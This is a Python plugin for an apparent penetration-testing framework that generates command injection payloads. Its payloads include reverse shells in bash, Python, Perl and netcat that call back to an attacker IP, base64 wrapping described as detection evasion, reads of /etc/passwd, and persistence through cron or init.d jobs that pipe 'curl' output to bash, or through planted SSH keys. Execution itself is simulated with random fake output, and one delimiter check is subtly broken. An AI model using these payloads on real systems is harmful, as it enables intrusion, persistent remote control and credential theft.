"""Command Injection exploit plugin for the exploitation engine."""

import asyncio
import logging
import random
import re
from typing import Any, Dict, List, Tuple

from sentinelprobe.exploitation.models import ExploitType, PayloadType
from sentinelprobe.exploitation.plugin import ExploitPlugin
from sentinelprobe.reconnaissance.models import Target
from sentinelprobe.vulnerability_scanner.models import (
    Vulnerability,
    VulnerabilitySeverity,
)

logger = logging.getLogger(__name__)


class CommandInjectionPlugin(ExploitPlugin):
    """Command Injection exploit plugin."""

    @property
    def name(self) -> str:
        """Get the name of the plugin.

        Returns:
            Plugin name
        """
        return "Command Injection"

    @property
    def description(self) -> str:
        """Get the description of the plugin.

        Returns:
            Plugin description
        """
        return "Exploits command injection vulnerabilities to execute OS commands on the target."

    @property
    def exploit_type(self) -> ExploitType:
        """Get the type of exploit this plugin provides.

        Returns:
            Exploit type
        """
        return ExploitType.COMMAND_INJECTION

    @property
    def payload_type(self) -> PayloadType:
        """Get the type of payload this plugin generates.

        Returns:
            Payload type
        """
        return PayloadType.SHELL_COMMAND

    @property
    def target_services(self) -> List[str]:
        """Get the services this plugin targets.

        Returns:
            List of service types
        """
        return ["web", "api", "cgi", "php", "python", "perl"]

    @property
    def risk_level(self) -> int:
        """Get the risk level of this exploit (1-10).

        Returns:
            Risk level
        """
        return 8  # High risk level - OS command execution

    async def check_applicability(
        self, vulnerability: Vulnerability, target: Target
    ) -> bool:
        """Check if this plugin is applicable to the given vulnerability.

        Args:
            vulnerability: The vulnerability to check
            target: The target with the vulnerability

        Returns:
            True if applicable, False otherwise
        """
        # Check if the vulnerability is related to command injection
        name_lower = vulnerability.name.lower()
        description_lower = (
            vulnerability.description.lower() if vulnerability.description else ""
        )

        if not any(
            term in name_lower or term in description_lower
            for term in [
                "command injection",
                "cmd injection",
                "os command",
                "shell command",
                "exec",
                "system()",
                "shell_exec",
                "popen",
                "backtick",
                "command execution",
                "rce",
                "remote code execution",
            ]
        ):
            return False

        # Check the affected component
        affected_component = (
            vulnerability.affected_component.lower()
            if vulnerability.affected_component
            else ""
        )
        if affected_component and not any(
            service in affected_component for service in self.target_services
        ):
            return False

        return True

    async def generate_payload(
        self, vulnerability: Vulnerability, target: Target, parameters: Dict[str, Any]
    ) -> str:
        """Generate a payload for the exploit.

        Args:
            vulnerability: The vulnerability to exploit
            target: The target with the vulnerability
            parameters: Additional parameters for payload generation

        Returns:
            The generated payload
        """
        # Determine the type of command injection payload to generate
        payload_type = parameters.get("payload_type", "information_gathering")

        if payload_type == "information_gathering":
            return self._generate_info_gathering_payload(vulnerability, parameters)
        elif payload_type == "reverse_shell":
            return self._generate_reverse_shell_payload(vulnerability, parameters)
        elif payload_type == "file_access":
            return self._generate_file_access_payload(vulnerability, parameters)
        elif payload_type == "persistence":
            return self._generate_persistence_payload(vulnerability, parameters)
        else:
            # Default to a basic test payload
            return self._generate_basic_payload(vulnerability, parameters)

    def _generate_basic_payload(
        self, vulnerability: Vulnerability, parameters: Dict[str, Any]
    ) -> str:
        """Generate a basic command injection payload.

        Args:
            vulnerability: The vulnerability to exploit
            parameters: Additional parameters for payload generation

        Returns:
            Basic command injection payload
        """
        # Simple command injection test payloads
        payloads = [
            "; id",
            "| id",
            "$(id)",
            "`id`",
            "& id",
            "&& id",
            "| whoami",
            "; whoami",
            "$(whoami)",
            "`whoami`",
            "|| whoami",
            "& echo sentinel-probe-test",
            "; echo sentinel-probe-test",
            "| echo sentinel-probe-test",
        ]

        return random.choice(payloads)

    def _generate_info_gathering_payload(
        self, vulnerability: Vulnerability, parameters: Dict[str, Any]
    ) -> str:
        """Generate an information gathering payload.

        Args:
            vulnerability: The vulnerability to exploit
            parameters: Additional parameters for payload generation

        Returns:
            Information gathering payload
        """
        # Choose a command delimiter based on the target environment
        delimiters = [";", "|", "$()", "`", "&&", "||"]
        delimiter = parameters.get("delimiter", random.choice(delimiters))

        if delimiter == "()":
            prefix, suffix = "$(", ")"
        elif delimiter == "`":
            prefix, suffix = "`", "`"
        else:
            prefix, suffix = delimiter + " ", ""

        # Information gathering commands
        commands = [
            "id",
            "whoami",
            "uname -a",
            "cat /etc/passwd",
            "ls -la /etc",
            "ps aux",
            "netstat -an",
            "ifconfig",
            "env",
            "cat /etc/issue",
            "cat /etc/hosts",
        ]

        # Allow user to specify a custom command
        command = parameters.get("command", random.choice(commands))

        return f"{prefix}{command}{suffix}"

    def _generate_reverse_shell_payload(
        self, vulnerability: Vulnerability, parameters: Dict[str, Any]
    ) -> str:
        """Generate a reverse shell payload.

        Args:
            vulnerability: The vulnerability to exploit
            parameters: Additional parameters for payload generation

        Returns:
            Reverse shell payload
        """
        # Get callback IP and port from parameters or use defaults
        callback_ip = parameters.get("callback_ip", "127.0.0.1")
        callback_port = parameters.get("callback_port", "4444")

        # Choose a command delimiter
        delimiters = [";", "|", "$()", "`", "&&"]
        delimiter = parameters.get("delimiter", random.choice(delimiters))

        if delimiter == "()":
            prefix, suffix = "$(", ")"
        elif delimiter == "`":
            prefix, suffix = "`", "`"
        else:
            prefix, suffix = delimiter + " ", ""

        # Various reverse shell payloads for different environments
        shell_type = parameters.get("shell_type", "bash")

        if shell_type == "bash":
            payload = f"bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1"
        elif shell_type == "python":
            payload = f'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{callback_ip}",{callback_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
        elif shell_type == "perl":
            payload = f'perl -e \'use Socket;$i="{callback_ip}";$p={callback_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''
        elif shell_type == "nc":
            payload = f"nc -e /bin/sh {callback_ip} {callback_port}"
        else:
            # Default to bash
            payload = f"bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1"

        # Encode if requested
        if parameters.get("encode", False):
            # Base64 encoding to evade detection
            import base64

            encoded_payload = base64.b64encode(payload.encode()).decode()
            return f"{prefix}echo {encoded_payload} | base64 -d | bash{suffix}"

        return f"{prefix}{payload}{suffix}"

    def _generate_file_access_payload(
        self, vulnerability: Vulnerability, parameters: Dict[str, Any]
    ) -> str:
        """Generate a file access payload.

        Args:
            vulnerability: The vulnerability to exploit
            parameters: Additional parameters for payload generation

        Returns:
            File access payload
        """
        # Choose a command delimiter
        delimiters = [";", "|", "$()", "`", "&&"]
        delimiter = parameters.get("delimiter", random.choice(delimiters))

        if delimiter == "()":
            prefix, suffix = "$(", ")"
        elif delimiter == "`":
            prefix, suffix = "`", "`"
        else:
            prefix, suffix = delimiter + " ", ""

        # Get target file from parameters or use defaults
        target_file = parameters.get("file", "/etc/passwd")

        # File access commands
        if parameters.get("action", "read") == "read":
            commands = [
                f"cat {target_file}",
                f"head -n 20 {target_file}",
                f"tail -n 20 {target_file}",
                f"grep -v '^#' {target_file}",
                f"less {target_file}",
            ]
        else:  # write
            content = parameters.get("content", "sentinel-probe-test")
            file_path = parameters.get("file", "/tmp/sentinel-probe-test.txt")
            commands = [
                f"echo '{content}' > {file_path}",
                f"echo '{content}' >> {file_path}",
                f"printf '{content}' > {file_path}",
            ]

        command = parameters.get("command", random.choice(commands))

        return f"{prefix}{command}{suffix}"

    def _generate_persistence_payload(
        self, vulnerability: Vulnerability, parameters: Dict[str, Any]
    ) -> str:
        """Generate a persistence payload.

        Args:
            vulnerability: The vulnerability to exploit
            parameters: Additional parameters for payload generation

        Returns:
            Persistence payload
        """
        # This is a high-risk payload, so we default to a safer option in most cases
        # Only generate real persistence payloads if explicitly requested
        if not parameters.get("enable_persistence", False):
            return self._generate_info_gathering_payload(vulnerability, parameters)

        # Choose a command delimiter
        delimiters = [";", "|", "$()", "`", "&&"]
        delimiter = parameters.get("delimiter", random.choice(delimiters))

        if delimiter == "()":
            prefix, suffix = "$(", ")"
        elif delimiter == "`":
            prefix, suffix = "`", "`"
        else:
            prefix, suffix = delimiter + " ", ""

        # Get callback IP and port from parameters or use defaults
        callback_ip = parameters.get("callback_ip", "127.0.0.1")
        callback_port = parameters.get("callback_port", "4444")

        # Persistence methods (NOTE: these would be dangerous in a real environment)
        persistence_type = parameters.get("persistence_type", "cron")

        if persistence_type == "cron":
            interval = parameters.get("interval", "*/5 * * * *")  # Every 5 minutes
            command = f"(crontab -l 2>/dev/null; echo '{interval} curl -s http://{callback_ip}:{callback_port} | bash') | crontab -"
        elif persistence_type == "startup":
            command = f"echo '#!/bin/bash\\ncurl -s http://{callback_ip}:{callback_port} | bash' > /etc/init.d/sentinel-service && chmod +x /etc/init.d/sentinel-service && update-rc.d sentinel-service defaults"
        elif persistence_type == "ssh_key":
            key = parameters.get(
                "ssh_key", "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..."
            )
            command = f"mkdir -p ~/.ssh && echo '{key}' >> ~/.ssh/authorized_keys"
        else:
            # Default to a simple shell script in user's home directory
            command = f"echo '#!/bin/bash\\ncurl -s http://{callback_ip}:{callback_port} | bash' > ~/.sentinel_update.sh && chmod +x ~/.sentinel_update.sh"

        return f"{prefix}{command}{suffix}"

    async def execute_exploit(
        self,
        vulnerability: Vulnerability,
        target: Target,
        payload: str,
        safe_mode: bool = True,
    ) -> Tuple[str, bool]:
        """Execute the exploit.

        Args:
            vulnerability: The vulnerability to exploit
            target: The target with the vulnerability
            payload: The payload to use
            safe_mode: Whether to operate in safe mode (no real exploitation)

        Returns:
            Tuple of (result text, success boolean)
        """
        # In real implementation, this would send the payload to the target
        # For now, we'll simulate the execution

        # Add a slight delay to simulate network latency and processing time
        await asyncio.sleep(0.8)

        # Always enforce safe mode for command injection (critical vulnerability)
        if not safe_mode:
            logger.warning(
                "Attempted to execute command injection in unsafe mode, "
                "which is not allowed. Switching to safe mode."
            )
            safe_mode = True

        # Simulate execution based on vulnerability severity
        success_probability = {
            VulnerabilitySeverity.CRITICAL: 0.95,
            VulnerabilitySeverity.HIGH: 0.8,
            VulnerabilitySeverity.MEDIUM: 0.6,
            VulnerabilitySeverity.LOW: 0.4,
            VulnerabilitySeverity.INFO: 0.2,
        }.get(vulnerability.severity, 0.6)

        # Add some randomness
        success = random.random() < success_probability

        if success:
            result = self._generate_success_result(vulnerability, payload)
        else:
            result = self._generate_failure_result(vulnerability, payload)

        return result, success

    def _generate_success_result(
        self, vulnerability: Vulnerability, payload: str
    ) -> str:
        """Generate a simulated success result.

        Args:
            vulnerability: The vulnerability
            payload: The payload used

        Returns:
            Simulated success result
        """
        # Determine the type of payload to generate appropriate output
        if "id" in payload or "whoami" in payload:
            return self._generate_id_command_result()
        elif "uname" in payload:
            return self._generate_uname_command_result()
        elif "passwd" in payload:
            return self._generate_passwd_file_result()
        elif "ps" in payload:
            return self._generate_process_list_result()
        elif "netstat" in payload or "ifconfig" in payload:
            return self._generate_network_command_result(payload)
        elif "nc" in payload or "bash -i" in payload or "socket" in payload:
            return self._generate_reverse_shell_result()
        elif "echo" in payload and (">" in payload or ">>" in payload):
            return self._generate_file_write_result(payload)
        elif (
            "crontab" in payload or "init.d" in payload or "authorized_keys" in payload
        ):
            return self._generate_persistence_result(payload)
        else:
            # Generic success message
            return "[+] Command executed successfully\n[+] Output received\n[+] Command injection vulnerability confirmed"

    def _generate_id_command_result(self) -> str:
        """Generate simulated output for id/whoami commands.

        Returns:
            Simulated command output
        """
        users = ["www-data", "apache", "nobody", "user", "admin", "root"]
        user = random.choice(users)

        if user == "root":
            return f"[+] Command injection successful\n[+] Output: uid=0({user}) gid=0({user}) groups=0({user})\n[+] WARNING: Target is running as root!"
        else:
            uid = random.randint(100, 999)
            gid = random.randint(100, 999)
            return f"[+] Command injection successful\n[+] Output: uid={uid}({user}) gid={gid}({user}) groups={gid}({user})"

    def _generate_uname_command_result(self) -> str:
        """Generate simulated output for uname command.

        Returns:
            Simulated command output
        """
        os_types = [
            "Linux server 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux",
            "Linux web-01 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux",
            "Linux centos-vm 3.10.0-1127.el7.x86_64 #1 SMP Tue Mar 31 23:36:51 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux",
            "Linux ubuntu-vm 5.8.0-44-generic #50-Ubuntu SMP Wed Feb 10 10:19:59 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux",
        ]

        selected_os = random.choice(os_types)
        return f"[+] Command injection successful\n[+] Output: {selected_os}"

    def _generate_passwd_file_result(self) -> str:
        """Generate simulated output for passwd file access.

        Returns:
            Simulated command output
        """
        passwd_entries = [
            "root:x:0:0:root:/root:/bin/bash",
            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
            "bin:x:2:2:bin:/bin:/usr/sbin/nologin",
            "sys:x:3:3:sys:/dev:/usr/sbin/nologin",
            "sync:x:4:65534:sync:/bin:/bin/sync",
            "games:x:5:60:games:/usr/games:/usr/sbin/nologin",
            "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin",
            "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin",
            "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin",
            "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin",
            "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin",
            "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin",
            "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
            "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin",
            "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin",
            "irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin",
            "gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin",
            "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin",
            "systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin",
            "systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin",
            "syslog:x:102:106::/home/syslog:/usr/sbin/nologin",
            "messagebus:x:103:107::/nonexistent:/usr/sbin/nologin",
            "mysql:x:104:115:MySQL Server,,,:/nonexistent:/bin/false",
            "redis:x:105:116:Redis Server,,,:/var/lib/redis:/usr/sbin/nologin",
            "sshd:x:106:65534::/run/sshd:/usr/sbin/nologin",
            "user:x:1000:1000:Regular User,,,:/home/user:/bin/bash",
            "admin:x:1001:1001:Admin User,,,:/home/admin:/bin/bash",
        ]

        # Select a random subset of entries
        selected_entries = random.sample(passwd_entries, min(15, len(passwd_entries)))

        passwd_output = "\n".join(selected_entries)
        return f"[+] Command injection successful\n[+] File access achieved\n[+] Output from /etc/passwd:\n\n{passwd_output}"

    def _generate_process_list_result(self) -> str:
        """Generate simulated output for process listing.

        Returns:
            Simulated command output
        """
        processes = [
            "root         1  0.0  0.1 167952  9080 ?        Ss   Jul10   0:16 /sbin/init",
            "root         2  0.0  0.0      0     0 ?        S    Jul10   0:00 [kthreadd]",
            "root       321  0.0  0.2  84728 22108 ?        Ss   Jul10   0:00 /usr/sbin/sshd -D",
            "root       345  0.0  0.4 169840 37456 ?        Ss   Jul10   0:01 /usr/sbin/apache2 -k start",
            "www-data   380  0.0  0.2 170104 20752 ?        S    Jul10   0:07 /usr/sbin/apache2 -k start",
            "www-data   381  0.0  0.2 170104 20752 ?        S    Jul10   0:06 /usr/sbin/apache2 -k start",
            "www-data   382  0.0  0.2 170104 20600 ?        S    Jul10   0:06 /usr/sbin/apache2 -k start",
            "mysql      403  0.0  1.5 1155112 123648 ?      Ssl  Jul10   2:34 /usr/sbin/mysqld",
            "root       421  0.0  0.1  63320 10528 ?        Ss   Jul10   0:01 /usr/sbin/cron -f",
            "user      1036  0.0  0.0  22092  5528 pts/0    Ss   11:34   0:00 -bash",
            "user      1095  0.0  0.0  36084  3368 pts/0    R+   11:47   0:00 ps aux",
        ]

        # Select a random subset of processes
        selected_processes = random.sample(processes, min(8, len(processes)))

        header = (
            "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND"
        )
        return (
            f"[+] Command injection successful\n[+] Process listing obtained\n[+] Output:\n\n{header}\n"
            + "\n".join(selected_processes)
        )

    def _generate_network_command_result(self, payload: str) -> str:
        """Generate simulated output for network commands.

        Args:
            payload: The payload used

        Returns:
            Simulated command output
        """
        netstat_entries = [
            "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN",
            "tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN",
            "tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN",
            "tcp        0      0 10.0.2.15:22            10.0.2.2:50582          ESTABLISHED",
            "tcp6       0      0 :::22                   :::*                    LISTEN",
            "tcp6       0      0 :::80                   :::*                    LISTEN",
            "udp        0      0 0.0.0.0:68              0.0.0.0:*",
            "udp        0      0 0.0.0.0:631             0.0.0.0:*",
        ]

        ifconfig_output = """
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        inet6 fe80::b885:5d:bd48:e2a3  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:a5:a6:76  txqueuelen 1000  (Ethernet)
        RX packets 20847  bytes 23765898 (23.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 11018  bytes 1541626 (1.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1734  bytes 154440 (154.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1734  bytes 154440 (154.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
"""

        if "netstat" in payload:
            selected_entries = random.sample(
                netstat_entries, min(5, len(netstat_entries))
            )
            header = "Proto Recv-Q Send-Q Local Address           Foreign Address         State"
            return (
                f"[+] Command injection successful\n[+] Network connections obtained\n[+] Output:\n\n{header}\n"
                + "\n".join(selected_entries)
            )
        else:
            return f"[+] Command injection successful\n[+] Network interfaces obtained\n[+] Output:{ifconfig_output}"

    def _generate_reverse_shell_result(self) -> str:
        """Generate simulated output for reverse shell attempts.

        Returns:
            Simulated command output
        """
        return "[+] Command injection successful\n[+] Reverse shell payload sent\n[+] Check your listener for incoming connection"

    def _generate_file_write_result(self, payload: str) -> str:
        """Generate simulated output for file write operations.

        Args:
            payload: The payload used

        Returns:
            Simulated command output
        """
        file_match = re.search(r">\s*(\S+)", payload)
        file_path = "/tmp/sentinel-probe-test.txt"

        if file_match:
            file_path = file_match.group(1)

        return f"[+] Command injection successful\n[+] File write operation completed\n[+] Data written to {file_path}"

    def _generate_persistence_result(self, payload: str) -> str:
        """Generate simulated output for persistence operations.

        Args:
            payload: The payload used

        Returns:
            Simulated command output
        """
        if "crontab" in payload:
            return "[+] Command injection successful\n[+] Persistence established via crontab\n[+] Cron job added successfully"
        elif "init.d" in payload:
            return "[+] Command injection successful\n[+] Persistence established via init script\n[+] Service created in /etc/init.d/"
        elif "authorized_keys" in payload:
            return "[+] Command injection successful\n[+] Persistence established via SSH key\n[+] Key added to authorized_keys"
        else:
            return "[+] Command injection successful\n[+] Persistence mechanism established\n[+] Target will maintain connection"

    def _generate_failure_result(
        self, vulnerability: Vulnerability, payload: str
    ) -> str:
        """Generate a simulated failure result.

        Args:
            vulnerability: The vulnerability
            payload: The payload used

        Returns:
            Simulated failure result
        """
        # Different failure messages based on payload type
        error_messages = [
            "[-] Command injection attempt failed\n[-] Error: Permission denied",
            "[-] Exploitation failed\n[-] Error: Input validation detected and blocked injection",
            "[-] Command execution failed\n[-] Error: Bad command or file name",
            "[-] Injection attempt blocked\n[-] Error: WAF detected and blocked malicious command",
            "[-] Exploitation failed\n[-] Error: Command could not be executed",
            "[-] Command injection failed\n[-] Error: Syntax error in command",
            "[-] Exploitation failed\n[-] Error: Command timed out",
        ]

        return random.choice(error_messages)

    async def check_success(
        self, vulnerability: Vulnerability, target: Target, result: str
    ) -> bool:
        """Check if the exploit was successful.

        Args:
            vulnerability: The vulnerability that was exploited
            target: The target with the vulnerability
            result: The result of the exploitation attempt

        Returns:
            True if successful, False otherwise
        """
        # Simple success check based on the result content
        if result.startswith("[+]") and "successful" in result:
            return True

        return False
